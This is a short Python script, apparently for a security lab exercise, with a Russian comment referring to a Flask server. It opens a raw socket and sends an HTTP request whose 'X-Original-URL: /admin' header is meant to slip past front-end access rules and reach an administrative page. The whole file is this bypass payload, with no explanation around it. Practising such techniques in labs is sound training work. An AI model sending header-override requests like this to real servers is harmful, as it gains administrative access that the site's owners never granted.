import socket

HOST = 'lap3-circumbent_via_header.labs-is-here.online'
PORT = 8000       # ваш Flask-сервер

payload = (
    "GET / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "X-Original-URL: /admin\r\n"
    "\r\n"
)

with socket.create_connection((HOST, PORT)) as s:
    s.sendall(payload.encode())
    print(s.recv(4096).decode())
